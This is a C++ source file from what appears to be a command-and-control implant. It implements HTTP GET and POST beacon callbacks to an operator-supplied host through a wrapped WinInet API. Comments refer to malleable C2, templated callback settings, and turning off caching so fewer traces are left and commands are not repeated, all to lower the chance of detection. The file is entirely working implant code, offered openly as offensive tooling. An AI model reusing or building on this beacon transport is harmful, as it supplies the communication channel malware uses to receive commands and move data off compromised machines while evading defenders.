/**
 * @file http.cpp
 * @brief Implements HTTP/HTTPS communication using the WinInet API.
 */

#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include "_debug/debug.h"
#include "defense/winapi.h"

//GET RID OF THIS.
//#pragma comment(lib, "wininet.lib")

/*
New approach, the protocols have no idea about malleable c2. All things are passed in as necessary instead of jinja templated in.
*/

/**
 * @brief Executes an HTTP request (typically GET) using WinInet.
 * * @param callback_host The target hostname or IP address (e.g., L"192.168.1.10" or L"example.com").
 * @param callback_port The target port number (e.g., 80 or 443).
 * @param http_verb The HTTP verb to use (e.g., L"GET").
 * @param uri The resource path/URI (e.g., L"/index.html").
 * @param headers A vector of formatted HTTP header strings to append to the request.
 * @param request_body The body of the HTTP request (typically empty for GET, but supported here for flexibility).
 * @param response A reference to a string where the server's returned response body will be appended.
 * @return true If the complete connection, request, and response reading sequence succeeds.
 * @return false If any stage of the connection or request fails.
 */
bool HTTP_GET(const std::wstring& callback_host, int callback_port, std::wstring http_verb, const std::wstring& uri, const std::vector<std::wstring>& headers, std::string& request_body, std::string& response) {
    // 1. Initialize
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw
    HINTERNET hInternet = WinApi::InternetOpenW(
        NULL, //user agent specified in headers, not here
        INTERNET_OPEN_TYPE_PRECONFIG,     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena#parameters: INTERNET_OPEN_TYPE_PRECONFIG: proxy OR direct, based on registry (matches inet expl)
        NULL,
        NULL,
        0
    );
    if (!hInternet) return false;

    // 2. Connect (Hardcoded IP and Port)
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnectw
    HINTERNET hConnect = WinApi::InternetConnectW(
        hInternet,
        callback_host.c_str(),           // Server - template,
        static_cast<DWORD>(callback_port),           // Port - template
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        WinApi::InternetCloseHandle(hInternet);
        return false;
    }

    // 3. Open Request (Hardcoded Path)
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
    HINTERNET hRequest = WinApi::HttpOpenRequestW(
        hConnect,
        http_verb.c_str(),   // Method
        uri.c_str(),         // Path
        NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
        0
    );
    if (!hRequest) {
        WinApi::InternetCloseHandle(hConnect);
        WinApi::InternetCloseHandle(hInternet);
        return false;
    }

    
    // 4. Add Headers Loop
    for (const auto& header : headers) {
        //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpaddrequestheadersa
        //easier to put headers here rather than 2nd arg of HttpSendRequest
        WinApi::HttpAddRequestHeadersW(hRequest, header.c_str(), -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE); // HTTP_ADDREQ_FLAG_REPLACE will replace an existing header of the same name
    }

    // 5. Send Request
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequestw
    //pass in body, will either be null, or a value. Used for flexibility on the "print"/body statement
    if (!WinApi::HttpSendRequestW(hRequest, NULL, 0, (LPVOID)request_body.c_str(), static_cast<DWORD>(request_body.length()))) {
        std::cerr << "Send failed: " << WinApi::GetLastError() << std::endl;
        WinApi::InternetCloseHandle(hRequest);
        WinApi::InternetCloseHandle(hConnect);
        WinApi::InternetCloseHandle(hInternet);
        return false;
    }

    // 6. Read Response
    uint8_t tempBuffer[4096];
    DWORD bytesRead;
    while (WinApi::InternetReadFile(hRequest, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
        response.insert(response.end(), tempBuffer, tempBuffer + bytesRead);
    }

    // Cleanup
    WinApi::InternetCloseHandle(hRequest);
    WinApi::InternetCloseHandle(hConnect);
    WinApi::InternetCloseHandle(hInternet);
    return true;
}

/**
 * @brief Executes an HTTP POST request using WinInet.
 * * @param callback_host The target hostname or IP address.
 * @param callback_port The target port number.
 * @param http_verb The HTTP verb to use (e.g., L"POST").
 * @param uri The resource path/URI.
 * @param headers A vector of formatted HTTP header strings to append to the request.
 * @param request_body The body of the HTTP request containing the payload to be sent.
 * @param response A reference to a string where the server's returned response body will be appended.
 * @return true If the complete connection, request, and response reading sequence succeeds.
 * @return false If any stage of the connection or request fails.
 */
//(const std::wstring& callback_host, int callback_port, std::wstring http_verb, const std::wstring& uri, const std::vector<std::wstring>& headers, std::string& request_body, std::string& response) {
bool HTTP_POST(const std::wstring& callback_host, int callback_port, std::wstring http_verb, const std::wstring& uri, const std::vector<std::wstring>& headers, std::string& request_body, std::string& response) {
    // 1. Initialize
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw
    HINTERNET hInternet = WinApi::InternetOpenW(
        NULL,   // user agents passed in headers                // user agent - template, malc2 this
        INTERNET_OPEN_TYPE_PRECONFIG,     //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena#parameters: INTERNET_OPEN_TYPE_PRECONFIG: proxy OR direct, based on registry (matches inet expl)
        NULL,
        NULL,
        0
    );
    if (!hInternet) return false;

    // 2. Connect (Hardcoded IP and Port)
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnectw
    HINTERNET hConnect = WinApi::InternetConnectW(
        hInternet,
        callback_host.c_str(), //L"[[callback_host]]",           // Server - template,
        static_cast<DWORD>(callback_port), //[[callback_port]],                   // Port - template
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) {
        WinApi::InternetCloseHandle(hInternet);
        return false;
    }

    // 3. Open Request (Hardcoded Path)
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequestw
    HINTERNET hRequest = WinApi::HttpOpenRequestW(
        hConnect,
        http_verb.c_str(),//L"[[http_post_verb]]",                // Method - template, mallc2 this
        uri.c_str(),//L"[[http_post_uri]]",          // Path - template, mallc2 this
        NULL, NULL, NULL,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
        0
    );
    if (!hRequest) {
        WinApi::InternetCloseHandle(hConnect);
        WinApi::InternetCloseHandle(hInternet);
        return false;
    }

    // 4. Add Headers Loop
    for (const auto& header : headers) {
        //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpaddrequestheadersa
        //easier to put headers here rather than 2nd arg of HttpSendRequest
        WinApi::HttpAddRequestHeadersW(hRequest, header.c_str(), -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE); // HTTP_ADDREQ_FLAG_REPLACE will replace an existing header of the same name
    }

    // 5. Send Request
    //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequestw
    if (!WinApi::HttpSendRequestW(hRequest, NULL, 0, (LPVOID)request_body.c_str(), request_body.length())) {
        std::cerr << "Send failed: " << WinApi::GetLastError() << std::endl;
        WinApi::InternetCloseHandle(hRequest);
        WinApi::InternetCloseHandle(hConnect);
        WinApi::InternetCloseHandle(hInternet);
        return false;
    }

    // 6. Read Response
    uint8_t tempBuffer[4096];
    DWORD bytesRead;
    while (WinApi::InternetReadFile(hRequest, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
        response.insert(response.end(), tempBuffer, tempBuffer + bytesRead);
    }

    // Cleanup
    WinApi::InternetCloseHandle(hRequest);
    WinApi::InternetCloseHandle(hConnect);
    WinApi::InternetCloseHandle(hInternet);
    return true;
}